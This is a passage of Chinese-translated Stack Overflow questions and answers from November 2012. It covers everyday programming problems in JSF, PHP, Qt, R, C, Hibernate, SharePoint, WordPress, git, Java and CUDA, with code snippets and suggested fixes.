    xmlns:f="http://java.sun.com/jsf/core"
    xmlns:ui="http://java.sun.com/jsf/facelets"
    xmlns:c="http://java.sun.com/jsp/jstl/core"
    xmlns:trkal="http://java.sun.com/jsf/composite/trkalcomponents">

<h:head>
    <title>Titulo</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</h:head>

<h:body>
    <h:form enctype="multipart/form-data">
        ...
        <trkal:toolbarbuttonwidget id="buttonToolbar" label="Action" iconName="toolbar.png"
            buttonAction="#{maisuBean.myActionListener}"
            >
        </trkal:toolbarbuttonwidget>
        ...
        <h:commandLink id="otherButton" actionListener="#{maisuBean.myActionListener}">
            <h:graphicImage library="images" name="toolbar.png" />
            <h:outputText value="Other Action" />
        </h:commandLink>
        ...

    </h:form>
</h:body>
</html> 
```

如您所见，此模板使用一个复合组件，允许指定听到此事件的动作侦听器。

```
<composite:interface>
    <composite:attribute name="id" />
    <composite:attribute name="buttonAction" method-signature="void myAction(javax.faces.event.ActionEvent)" targetAttributeName="actionListener"/>
    <composite:attribute name="iconName" />
    <composite:attribute name="label"/>
    <composite:attribute name="title"/>
    <composite:attribute name="styleClass"/>
</composite:interface>
<composite:implementation>
    <h:outputStylesheet target="head" library="trkalcomponents" name="toolbarbuttonwidget.css"  />
    <h:commandLink id="buttonAction">
        <h:graphicImage library="images" name="#{cc.attrs.iconName}" />
        <h:outputText value="#{cc.attrs.label}" />
    </h:commandLink>
</composite:implementation> 
```

如果我点击**otherButton**，它工作正常，但如果我点击**buttonToolbar**它不工作。

```
09-nov-2012 19:16:28 javax.faces.event.MethodExpressionActionListener processAction
GRAVE: Se ha recibido 'javax.el.PropertyNotFoundException' al invocar la escucha de acción '#{maisuBean.myActionListener}' para el componente 'buttonAction'
09-nov-2012 19:16:28 javax.faces.event.MethodExpressionActionListener processAction
GRAVE: javax.el.PropertyNotFoundException: /template.xhtml @20,6 buttonAction="#{maisuBean.myActionListener}": Propiedad 'myActionListener' no hallada en el tipo com.joxeja.test.ToolBarBean
    at com.sun.faces.facelets.el.TagValueExpression.getValue(TagValueExpression.java:111) 
```

它似乎无法解析复合组件内的 EL 表达式。

怎么了？如何在一个模板中使用一个复合组件？

我正在使用 Mojarra 2.1.7

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T15:05:29.327

对不起，我在第一次阅读时错过了这个：

您的实现未正确定位属性。我犯了这个错误（我很确定我们所有人都这样做）。您需要将属性引用为 ->`#{cc.attrs.someAttribute}`而不是其名称。您对大多数元素执行此操作，但不是`actionListener`. 如果那是您的代码，它应该修复它。你的签名是正确的。您正在尝试使用`targetAttributeName`我不熟悉的。我的猜测是您需要将`id`组件的名称设置为该名称（因此您的按钮`myAction`不会`actionListener`（如果我引用的示例与您相同）。

除此之外，我会怎么做：

```
 <composite:interface>
    <composite:attribute name="id" />
    <!-- 
    <composite:attribute name="buttonAction" method-signature="void myAction(javax.faces.event.ActionEvent)" targetAttributeName="actionListener"/>
    -->
    <composite:attribute name="buttonAction" method-signature="void action(javax.faces.event.ActionEvent)"/>  
    <composite:attribute name="iconName" />
    <composite:attribute name="label"/>
    <composite:attribute name="title"/>
    <composite:attribute name="styleClass"/>
</composite:interface>
<composite:implementation>
    <h:outputStylesheet target="head" library="trkalcomponents" name="toolbarbuttonwidget.css"  />
        <!-- fix below -->
        <h:commandLink id="buttonAction" actionListener=#{cc.attrs.buttonAction}>
            <h:graphicImage library="images" name="#{cc.attrs.iconName}" />
            <h:outputText value="#{cc.attrs.label}" />
        </h:commandLink>
    </composite:implementation> 
```

我喜欢这种方法，因为它与标记页面的其他方式相似，而且看起来很简单。试一试。

# http - 是否可以使用 IBM Sterling B2B Integrator 进行 HTTP 多部分表单 POST？

> ID：13313886
> 
> 赞同：2
> 
> 时间：2012-11-09T18:30:13.387
> 
> 标签：http, integrator

[此处](http://pic.dhe.ibm.com/infocenter/sb2bi/v5r2/index.jsp?topic=/com.ibm.help.svcs_adpts_a_l.doc/HTTP_Client_POST_svc.html)的文档描述了如何为此系统设置 HTTP POST，但没有描述是否或如何设置一般的表单变量和具体的表单文件上传。我的目标是与一个接受文件作为表单 POSTS 的网站集成，我什至不确定这是否可能。

能否将 IBM Sterling Integrator 配置为使用文件上传制作 HTTP 多部分表单 POST？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-29T07:58:45.640

我最近遇到了这个问题，我也不得不对传入的 xml 进行 XLST 翻译

在 xlst 中，您指定以下内容：

```
<xsl:output method="text" media-type="multipart/form-data" /> 
```

# php - ZipArchive 不存档

> ID：13313887
> 
> 赞同：0
> 
> 时间：2012-11-09T18:30:15.727
> 
> 标签：php, ziparchive

ZipArchive 根本不创建存档！
我试过了：

```
$zip = new ZipArchive($this->name, ZIPARCHIVE::CREATE);

$zip = new ZipArchive($this->name, ZIPARCHIVE::OVERWRITE);

$zip = new ZipArchive();
$zip->open($this->name, ZIPARCHIVE::CREATE);

$zip = new ZipArchive();
$zip->open($this->name, ZIPARCHIVE::OVERWRITE); 
```

但 all 不会创建存档并返回 true！
如果我尝试使用 fopen 创建文件，它通常可以工作，所以这不是权限问题

一些想法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:34:11.287

一定要打电话`$zip->close()`

另外，如果您不向其中添加任何内容，我也不记得它是否会创建该文件（您的问题并未说明您是否这样做）。

# c++ - 在 Qt 中更改语言环境

> ID：13313896
> 
> 赞同：11
> 
> 时间：2012-11-09T18:31:15.837
> 
> 标签：c++, qt, translation

我尝试使用 QLocale 和 setDefault 函数更改语言环境，但它似乎不起作用。这是使用 C 本地化库和 QLocale 更改语言环境的示例。对于 C 本地化库，它似乎可以工作，但对于 QLocale，似乎忽略了 setDefault 函数调用。

```
QLocale curLocale(QLocale("pl_PL"));
QLocale::setDefault(curLocale);
QDate date = QDate::currentDate();
QString dateString = date.toString();
// prints "Fri Nov 9 2012" but that was not expected
std::cout << dateString.toStdString() << std::endl;
// prints "en_US", but shouldn't it be "pl_PL"?
std::cout << QLocale::system().name().toStdString() << std::endl;

std::setlocale(LC_ALL, "pl_PL");
// prints "pl_PL"
std::cout << std::setlocale(LC_ALL, 0) << std::endl;
std::time_t currentTime;
std::time(&currentTime);
std::tm* timeinfo = std::localtime(&currentTime);
char charArray[40];
std::strftime(charArray, 40, "%a %b %d %Y", timeinfo);
// prints "pi lis 09 2012" and that's cool
std::cout << charArray << std::endl; 
```

如何在 Qt 中正确更改语言环境以影响程序？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-09T19:14:29.090

`QLocale::setDefault()`不会更改系统区域设置。它改变了`QLocale`使用默认构造函数创建的对象是什么。

据推测，系统区域设置只能由用户通过系统控制面板/首选项进行更改。如果要格式化不在系统区域设置中的内容，则需要专门使用区域设置对象来执行此操作。

这段代码：

```
QLocale curLocale(QLocale("pl_PL"));
QLocale::setDefault(curLocale);
QDate date = QDate::currentDate();
QString dateString = QLocale().toString(date);
qDebug() << dateString;
qDebug() << QLocale().name(); 
```

打印这个：

```
"piątek, 9 listopada 2012" 
"pl_PL" 
```

# jquery - 存根 jQuery.fn 方法在 Chrome 和 Firefox 中运行良好，IE8 失败

> ID：13313897
> 
> 赞同：3
> 
> 时间：2012-11-09T18:31:15.867
> 
> 标签：jquery, qunit, sinon

我正在使用带有 QUnit 的 sinon 存根编写一系列测试。测试的方法具有自定义插件的依赖关系，我们将调用 Foo，我将其删除：

```
// setup
var stub = this.stub(jQuery.fn, "Foo").returns("");

// run
someProprietyMethod();

// assertions
equal(stub.args.length, 3);
equal(stub.args[0], "bar");
equal(stub.thisValues[0], "#some-selector");
// other assertions 
```

与手动创建存根相比，我发现使用 sinon 存根非常简单和直观。问题是这在 Chrome 和 Firefox 中运行良好，但在 IE8 中不行。

对于测试结果中的 IE8，我得到：

```
Died on test #1 undefined: Object doesn't support this property or method 
```

在测试代​​码中放置一些调试面包屑，看起来 $().Foo 和 $.fn.Foo 都被视为方法，但是在调用 $("#some-selector").Foo() 后测试停止运行, 在 IE8 中运行时。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-29T00:28:50.583

我最终编写了自己的存根库，因为现有的存根库似乎无法存根 jQuery 的原型。

当你存根一个方法时，其中一个问题似乎是丢失了“this”的上下文，如果你想测试那个上下文——我就是这样做的。

# r - 创建汇总输出矩阵

> ID：13313898
> 
> 赞同：0
> 
> 时间：2012-11-09T17:38:53.090
> 
> 标签：r

如何在 R 统计包中的矩阵类型变量中插入来自多个回归分析的汇总输出？

这是我的脚本，它运行回归并在变量中收集截距和 co-eff：

```
for (i in 2:(ncol(data.base)))     {
  Test <- lm(data.base[,i] ~ log(database$var.1))
      results <- rbind(results, c(Test$coefficients))
} 
```

我想做的是将`summary(lm-test)`每个回归导入到矩阵类型变量中。我假设矩阵类型变量是我需要的。

我感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:23:56.180

呸！在我看来，那里有一些讨厌的变量命名。

我看到`data.base`有结果，您不想要第一列，但每列都是单独的结果。您还有`database`一个带有变量的 data.frame `var.1`。运行每个回归，以矩阵格式存储它们。

这是一个开始：

```
fits <- apply(data.base[, -1], 2, function(y) lm(y ~ log(database$var.1))
summ <- lapply(fits, summary)
summ <- lapply(fits, coef)
Reduce(cbind, summ) 
```

# c# - 使用 OOP 设计将 Silverlight 数据网格导出到 excel

> ID：13313902
> 
> 赞同：1
> 
> 时间：2012-11-09T18:31:43.307
> 
> 标签：c#, silverlight, oop, datagrid, export-to-excel

我正在编写一个包含一些数据网格的小型应用程序，我需要将这些网格导出到 MS Excel，它现在运行良好，但是它根本不是一个好的 OO 设计，因为我需要为每个数据网格复制我的代码而不是有一个能够导出到 Excel 的类，这正是我的问题，我不知道如何创建这个类，现在对于我拥有的每个数据网格导出。

```
//Save dialog...create workbook... datashee, etc...
//Now.. fill the Excel with the datagrid info.
//To create the headers in a grid independent way I have
for (int i = 0; i < gridgui.Columns.Count; i  ) worksheet.Cells[0, i] = new Cell(gridgui.Columns[i].Header);

//My problem is... I dont know how to fill the content in a Source independent way, and I have fixed properties like this:
int renglon = 1;
foreach (dataStuff reg in infogrid) 
//dataStuff is my class that fills the ObservableCollection called infrogrid
{
    if (reg.Product != null)
    {
        worksheet.Cells[renglon, 0] = new Cell(reg.Product);
        worksheet.Cells[renglon, 1] = new Cell(reg.Price);
        renglon++;
    }
} 
```

这种方法现在工作得很好，但是我知道这不是最好的方法，我的想法是有一个接收 ObservableCollection 和数据网格的类（获取标题名称。可选？）并将其导出到 excel 中，如：

```
Exportme myexport = new Exportme(grid1,list1);
myexport.export();
Exportme myexport2 = new Exportme(grid2,list2);
myexport2.export(); 
```

而不是使用我当前的复制粘贴技术:(

提前致谢。

# php - 变量类名忽略“使用”

> ID：13313904
> 
> 赞同：4
> 
> 时间：2012-11-09T18:31:56.407
> 
> 标签：php, namespaces

从其他帖子看来，如果您定义了命名空间并希望在另一个命名空间中动态创建对象，则必须构造一个字符串并在新调用中使用它。但是，我有一个奇怪的行为。似乎此方法不适用于跨命名空间。

用户.php：

```
namespace application\models;

class User {

        public function hello() {
                echo "Hello from User!";
        }
} 
```

控制器.php：

```
namespace application\controllers;

use application\models;

require('User.php');

$userStr = 'models\\User';
//$userOne = new $userStr();  //Doesn't work. Gets a "Class 'models\User' not found" error
$userOne = new models\User();  //Works fine

$userStr = '\\application\\models\\User';
$userTwo = new $userStr();  //Works fine

$userOne->hello();
$userTwo->hello(); 
```

知道为什么在使用变量作为类名时，我需要在变量中使用完全限定的命名空间，但是硬编码，我可以利用“use”命令？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:43:33.243

您不能将 with 导入[`use`](http://php.net/language.namespaces.importing)到变量类名中。这是 PHP 的限制。

另请参阅相关问题：

*   [将 PHP 命名空间别名扩展为完整的命名空间字符串](https://stackoverflow.com/q/7896456/367456)
*   [无法使用命名空间从动态类中获取常量](https://stackoverflow.com/q/7663270/367456)

# c - flex中的链接未完成问题

> ID：13313914
> 
> 赞同：0
> 
> 时间：2012-11-09T18:33:07.110
> 
> 标签：c, compiler-construction, compilation, compiler-errors, flex-lexer

我正在尝试通过“cc -c -o”创建一个目标文件，但我得到以下语句，我应该怎么做才能解决这个问题，提前谢谢

```
~/hedor1>lex -t example.l > example.c
~/hedor1>cc -c -o example.o example.l
cc: example.l: linker input file unused because linking not done 
```

生成 example.c 的第一行正在工作，我得到了 .c 文件，但是当我编写第二行时，我得到了上面的内容！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-10T14:58:53.060

您将 flex 源代码传递给编译器，编译器显然将其解释为链接器输入文件，并抱怨因为您告诉编译器不要执行链接步骤。

第二个命令应该是：

```
cc -c -o example.o example.c 
```

# sharepoint-2010 - 与内容类型保留策略关联的 SharePoint 2010 顺序工作流

> ID：13313918
> 
> 赞同：2
> 
> 时间：2012-11-09T18:33:38.827
> 
> 标签：sharepoint-2010, content-type, sharepoint-workflow

嗨：我构建了一个简单的顺序工作流，由内容类型使用的保留策略触发。该工作流获取当前项目的元数据并将其复制到位于不同网站集中的清除日志列表中。

由于保留策略而很难对此进行调试，这依赖于两个计时器作业：信息管理和过期策略。将调试器附加到 w3wp 和 owetimer 进程，但不能可靠地捕获激活的工作流。

我的每个文件的工作流程历史列表显示成功完成的工作流程。工作流的核心是一个代码活动，它从当前项目收集数据并更新一个中央列表。该过程完成后，该列表显示零项。它是位于代码活动中的代码吗？

我删除了所有异常处理以简化显示的内容。

# 代码

```
public Workflow1()
{
InitializeComponent();
}

public Guid workflowId = default(System.Guid);
public SPWorkflowActivationProperties workflowProperties = new SPWorkflowActivationProperties();

string purgeLogListPath = @"http://shptserver/sites/sp";
string listPath = @"http://shptserver/sites/sp/Lists/PurgeLog/AllItems.aspx";

private void onWorkflowActivated1_Invoked(object sender, ExternalDataEventArgs e)
{
}

private void codeActivity1_ExecuteCode(object sender, EventArgs e)
{
  SPSecurity.RunWithElevatedPrivileges(delegate()
  {
    using (SPSite site = new SPSite(purgeLogListPath))
    {
       try
       {
         SPWeb web = site.OpenWeb("/");
         SPList list = web.GetListFromUrl(listPath);
         DateTime today = DateTime.Now;

         SPListItem item = list.Items.Add();

         item["Title"] = onWorkflowActivated1.WorkflowProperties.Item.DisplayName;
         item["Encoded Absolute URL"] = onWorkflowActivated1.WorkflowProperties.ItemUrl;
         item["Content Type"] = onWorkflowActivated1.WorkflowProperties.Item.ContentType.Name;
         item["Date Purged"] = today.ToString("MMMM dd yyyy");
         item["DateTime Purged"] = today.ToString("MMMM dd yyyy hh:mm:ss");

         item.Update();
         }
         catch (Exception ex)
         {
         string errorEntry = ex.Message;
         }
         }
         });
     }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-15T10:55:35.633

真的不明白你的问题是什么，但对于调试问题，尝试这样做：1）部署后，你应该重新启动定时器服务 2）通过中央管理员，你可以去定时器工作并选择“立即运行”触发作业并开始调试

# html - 缺少 WordPress 标头

> ID：13313920
> 
> 赞同：2
> 
> 时间：2012-11-09T18:33:41.023
> 
> 标签：html, wordpress

我是我高中学生[报纸网站](http://www.theghsjournal.com/)的网站管理员，该网站在 WordPress 上运行。网站标题中的徽标显示在主页上，但是当我单击任何文章时，徽标消失并且替代文本显示。这是主题中 header.php 的徽标部分。

```
<!-- Logo -->
<div class="logo">
<a href="<?php echo get_option('home'); ?>/" title="<?php bloginfo('name'); ?> - <?php bloginfo('description'); ?>"><img id="logo" src="wp-content/uploads/2012/10/5.png" alt="The GHS Journal" title="<?php bloginfo('name'); ?> - <?php bloginfo('description'); ?>" /></a>
</div>
<!-- /Logo --> 
```

任何解决此问题的提示都非常感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:38:20.043

这是因为您使用的是相对路径。你应该使用这个：

```
<img id="logo" src="<?php bloginfo('wpurl'); ?>/wp-content/uploads/2012/10/5.png" alt="The GHS Journal" title="<?php bloginfo('name'); ?> - <?php bloginfo('description'); ?>" /> 
```

# c - for 循环将只执行一个循环

> ID：13313921
> 
> 赞同：1
> 
> 时间：2012-11-09T18:33:44.100
> 
> 标签：c, for-loop, initialization

我需要编写一个 C 程序来读取`1<=students<=25`班级中的学生人数（），并让每个学生阅读他的考试成绩`10/20` `15/20`等（`1<=score<=20`）并打印学生的最高和最高分数以及班级的平均分数。

我制作了这个程序，但`for`由于某种原因它只执行了一次循环。

你能帮我理解为什么吗？

这是代码：

```
#include <stdio.h>

int main(void) {
    int m,i,b,sum,min,max,mo;
    sum=0;
    while (m<1 || m>25) {
            printf("give number of students ");
            scanf("%d",&m);
    }
    for (i=1; i<(m+1); i++) {
            while (b<1 || b>20) {
            printf("give score of  %d student",i);
            scanf("%d",&b);
            }

            if(i==1) {
                    min=b;
                    max=b;
            }
            else {
                    if(b<min) min=b;
                    if(b>max) max=b;
            }
            sum=sum+b;
    }
    mo=sum/m;
    printf("max is  %d and min is  %d and avg is  %d",max,min,mo);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:40:38.587

首先 - 初始化你的变量：

```
int m,i,b,sum,min,max,mo; // these are declared and uninitialized

m = 0;  // now it's initialized to 0
i = 0;
... 
```

如果您不将它们初始化为某些东西，那么您将不知道它们从什么开始。

第二 - 您需要更改的值`b`：

```
for (i=1; i<(m+1); i++) {
        while (b<1 || b>20) {  <-- here you're checking for b being valid
        printf("give score of %d student",i);
        scanf("%d",&b);
        } 
```

因此，b 中的第一次将在 1 到 20 之间，如果您不将其重置为无效的值，您将永远不会再回到这里。记录 b 的值后：

```
 sum=sum+b;
    b = 0;   // we're done with b for now, set it to something invalid for the while()
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:42:37.017

你忘了初始化`B`变量，所以它循环了 m​​ 次，从不要求你插入分数！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T18:44:14.337

**1.**你在这里初始化'm'，没有任何先验值

```
 int m,i,b,sum,min,max,mo; 
```

**2.**没有值，你检查这个条件。这意味着，将使用垃圾值。（可能/可能不满足您的条件）

```
 while (m<1 || m>25) { 
```

**3.** m的关键scanf在前一个while内。没有它，您的 FOR 将运行基本 i=1 并停止。

```
 for (i=1; i<(m+1); i++) { 
```

**您需要了解 C 中的垃圾值以及在使用变量之前将变量初始化为初始值的重要步骤。**

您可以在此链接上阅读更多内容： [什么是垃圾值/它在 C 中是如何发生的](https://stackoverflow.com/questions/4137239/garbage-values-in-c-c)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-09T18:37:23.703

未初始化`m`并在`while`条件下使用

它`undefined behaviour`在条件下使用未初始化的局部变量

想要实现相同的

利用

```
do
{
  printf("give number of students ");
            scanf("%d",&m);
}
while(m<1 || m>25); 
```

`for (i=1; i<(m+1); i++)`改变条件，因为`i<=m`它是一种很好的技术`<`，然后`1` 在这个循环中添加使用相同的`do while`循环

# java - ConstraintViolationException：重复条目

> ID：13313922
> 
> 赞同：3
> 
> 时间：2012-11-09T18:33:50.477
> 
> 标签：java, mysql, hibernate

我想在 linf 中有很多档案，有些档案可能有空 linf。我的基本休眠注释如下：

```
@Entity
public class Linf {
    @OneToMany(fetch = FetchType.LAZY, cascade = CascadeType.ALL)
    public Set<Archive> getArchive() {
        return archives;
    }

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Column(name = "ID")
    public long getId() {
        return this.id;
    }
}

@Entity
public class Archive {
    public Archive() {
    }

    @OneToMany(fetch = FetchType.LAZY, cascade = CascadeType.ALL)
    public Linf getLinf() {
        return linf;
    }

    public void setLinf(Linf linf) {
        this.linf = linf;
    }

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @Column(name = "ID")
    public long getId() {
        return this.id;
    }

} 
```

当我通过 sess.saveOrUpdate(linfHbm) 保存 Linf 对象时，我得到

```
Exception in thread "main" org.hibernate.exception.ConstraintViolationException: Duplicate entry '1' for key 'archive_ID'
    at org.hibernate.exception.internal.SQLExceptionTypeDelegate.convert(SQLExceptionTypeDelegate.java:74)
    at org.hibernate.exception.internal.StandardSQLExceptionConverter.convert(StandardSQLExceptionConverter.java:49)
    at org.hibernate.engine.jdbc.spi.SqlExceptionHelper.convert(SqlExceptionHelper.java:125)
    at org.hibernate.engine.jdbc.spi.SqlExceptionHelper.convert(SqlExceptionHelper.java:110)
    at org.hibernate.engine.jdbc.internal.proxy.AbstractStatementProxyHandler.continueInvocation(AbstractStatementProxyHandler.java:129)
    at org.hibernate.engine.jdbc.internal.proxy.AbstractProxyHandler.invoke(AbstractProxyHandler.java:81)
    at $Proxy21.executeUpdate(Unknown Source)
    at org.hibernate.engine.jdbc.batch.internal.NonBatchingBatch.addToBatch(NonBatchingBatch.java:56)
    at org.hibernate.persister.collection.AbstractCollectionPersister.recreate(AbstractCollectionPersister.java:1260)
    at org.hibernate.action.internal.CollectionRecreateAction.execute(CollectionRecreateAction.java:58)
    at org.hibernate.engine.spi.ActionQueue.execute(ActionQueue.java:362)
    at org.hibernate.engine.spi.ActionQueue.executeActions(ActionQueue.java:354)
    at org.hibernate.engine.spi.ActionQueue.executeActions(ActionQueue.java:279)
    at org.hibernate.event.internal.AbstractFlushingEventListener.performExecutions(AbstractFlushingEventListener.java:326)
    at org.hibernate.event.internal.DefaultFlushEventListener.onFlush(DefaultFlushEventListener.java:52)
    at org.hibernate.internal.SessionImpl.flush(SessionImpl.java:1210)
    at org.hibernate.internal.SessionImpl.managedFlush(SessionImpl.java:399)
    at org.hibernate.engine.transaction.internal.jdbc.JdbcTransaction.beforeTransactionCommit(JdbcTransaction.java:101)
    at org.hibernate.engine.transaction.spi.AbstractTransactionImpl.commit(AbstractTransactionImpl.java:175)
    at org.kriyak.utils.ImportLinfs.main(ImportLinfs.java:43)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at com.intellij.rt.execution.application.AppMain.main(AppMain.java:120)
Caused by: com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException: Duplicate entry '1' for key 'archive_ID'
    at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
    at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39)
    at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27)
    at java.lang.reflect.Constructor.newInstance(Constructor.java:513)
    at com.mysql.jdbc.Util.handleNewInstance(Util.java:411)
    at com.mysql.jdbc.Util.getInstance(Util.java:386)
    at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:1039)
    at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4096)
    at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4028)
    at com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2490)
    at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2651)
    at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2683)
    at com.mysql.jdbc.PreparedStatement.executeInternal(PreparedStatement.java:2144)
    at com.mysql.jdbc.PreparedStatement.executeUpdate(PreparedStatement.java:2444)
    at com.mysql.jdbc.PreparedStatement.executeUpdate(PreparedStatement.java:2362)
    at com.mysql.jdbc.PreparedStatement.executeUpdate(PreparedStatement.java:2347)
    at sun.reflect.GeneratedMethodAccessor28.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.hibernate.engine.jdbc.internal.proxy.AbstractStatementProxyHandler.continueInvocation(AbstractStatementProxyHandler.java:122)
    ... 20 more 
```

导致进程崩溃的最后一个 sql 命令是：

插入 Linf_Archive (Linf_ID, archive_ID) 值 (?, ?)

此表中的两个字段都不能为空。

知道为什么会发生这种情况吗？

PS：我已经隔离了导致崩溃的代码。这是产生问题的简单场景：

```
Session sess = getSessionFactory().getCurrentSession();
sess.beginTransaction();
Archive a = new Archive();
Linf linf1 = new Linf();
Linf linf2 = new Linf();
linf1.setTitle("aa1");
linf2.setTitle("aa2");
linf1.getArchive().add(a);
linf2.getArchive().add(a);
sess.save(linf1);
sess.save(linf2);
sess.getTransaction().commit(); 
```

请注意，存档的 linf 为零。这可能是非法的吗？但是如果真的想要这个方案呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-10T18:55:27.397

正如我发现的那样，`@ManyToMany`关系正是应该在这里使用的。如果 signle 对象属于两个不同的集合，则在 case 中会发生上述异常`@OneToMany`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:40:28.043

请确保您使用正确`MySQLDialect`，

另外，添加`Archive`到的时候`Linf`，是不是`setting the parent object`在保存前？

```
 public void add(Archive archive){
         if(this.archives == null){
              this.archives = new HashSet<Archive>();
         }
         archive.setLinf(this); //setting the parent
         this.archives.add(archive);
    } 
```

`MailSourceFile`添加时相同`Archive`吗？这是照顾外来重点人群所必需的。

# git - 统计全球用户的 git 提交

> ID：13313923
> 
> 赞同：0
> 
> 时间：2012-11-09T18:33:52.413
> 
> 标签：git

作为生产力的粗略衡量标准，我想衡量我在给定时间段内所做的 git 提交的数量。理想情况下，我还想测量诸如“文本量”之类的变化，但我可以看到这可能会更难。我的许多项目都是家庭项目，所以我更愿意从 git 获取这些信息。

我知道我可以`git log --author=johnsalvatier`得到我为给定项目所做的所有提交，但如果可能的话，我想在全球范围内这样做。那可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:43:17.440

你可以试试[GitStats](http://gitstats.sourceforge.net/)。它将为您提供个人作者统计信息（添加/删除的行、提交次数、活动等）以及随着时间的推移有关存储库的一般信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T18:37:23.727

您始终可以编写脚本，但 git 本身不知道您本地系统上的任何存储库，除了您当前所在的任何存储库，而且如果没有帮助，它当然无法在其他计算机上找到您的存储库。:-)

但是，如果您的所有项目都是开源的，您可以查看[http://www.ohloh.net/](http://www.ohloh.net/)。

# php - 如何将 md5 哈希之类的字符串转换为原始二进制字符串？

> ID：13313927
> 
> 赞同：3
> 
> 时间：2012-11-09T18:34:18.703
> 
> 标签：php, hash, md5

> **可能重复：**
> [如何在 PHP 中将数据的十六进制表示转换为二进制数据？](https://stackoverflow.com/questions/2602802/how-to-convert-hexadecimal-representation-of-data-to-binary-data-in-php)

如何将基于 md5 哈希字符串的表示转换为其原始二进制格式？

请注意，这`md5($data,true)`不是一个选项，因为我无权访问，`$data`但只能以字符串格式访问它的 md5 哈希。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-09T18:36:50.110

使用 hex2bin [http://php.net/manual/de/function.hex2bin.php](http://php.net/manual/de/function.hex2bin.php)（这适用于 PHP >= 5.4）

```
$bin = hex2bin(md5($data)); 
```

如果您没有 PHP 5.4，请尝试这样的用户实现[http://devcorner.georgievi.net/pages/programming/php/hex2bin-php](http://devcorner.georgievi.net/pages/programming/php/hex2bin-php)

# java - 从给定的列表中做出不同的选择

> ID：13313928
> 
> 赞同：1
> 
> 时间：2012-11-09T18:34:20.263
> 
> 标签：java, arraylist, hashmap

我正在尝试从我拥有的给定集合中创建一个由独特成员组成的团队。这就是我到目前为止所拥有的。

```
import java.util.*;
import java.lang.*;

class Main
{
   public static void main (String[] args) throws java.lang.Exception
   {
        /* Putting all team-mates in HashMap */

        HashMap<String, Integer> map = new HashMap<String, Integer>();
        map.put("a", 1);
        map.put("b", 2);
        map.put("c", 3);
        map.put("d", 4);

        /* Printing out the random name and the Unique number with it*/

        List<Integer> valuesList = new ArrayList<Integer>(map.values());
        List<String> keyList = new ArrayList<String>(map.keySet());
        System.out.println("The Team members are :");
        for (int i = 0; i < 3; i++)
        {
            int randomIndex = new Random().nextInt(valuesList.size());
            Integer randomValue = valuesList.get(randomIndex);
            String randomKey = keyList.get(randomIndex);
            System.out.println(randomValue+" "+randomKey);
        }
    }
} 
```

当我运行它时，我的列表中有重复，我是否使用 Collections.shuffle(valuesList)？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:38:51.020

您可以两次随机获得相同的数字，`Collections.shuffle(...)`应该这样做。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:45:16.490

如果 a,b,c,d 是你所追求的，我会这样做：

```
import java.util.*;
import java.lang.*;

class Main
{
   public static void main (String[] args) throws java.lang.Exception
   {
        /* Putting all team-mates in a List*/

        List<String> list = new ArrayList<String>();
        list.add("a");
        list.add("b");
        list.add("c");
        list.add("d");

        /* Printing out the random name */

        System.out.println("The Team members are :");
        for(int i = 0; i < 3; i++)
        {
            int randomIndex = new Random().nextInt(list.size());
            //Integer randomValue = valuesList.get(randomIndex);
            String randomValue = list.remove(randomIndex);
            //String randomKey = keyList.get(randomIndex);
            System.out.println(randomValue);
        }
    }
} 
```

选择后从列表中删除所选元素将确保它们不会再次出现。

也少了几行。

# cuda - 创建 CUDA 上下文的区别

> ID：13313930
> 
> 赞同：3
> 
> 时间：2012-11-09T18:34:27.040
> 
> 标签：cuda, nvidia, nvcc, cuda-context

我有一个使用三个内核的程序。为了获得加速，我正在做一个虚拟内存复制来创建一个上下文，如下所示：

```
__global__ void warmStart(int* f)
{
    *f = 0;
} 
```

它是在我想要计时的内核之前启动的，如下所示：

```
int *dFlag = NULL;
cudaMalloc( (void**)&dFlag, sizeof(int) );
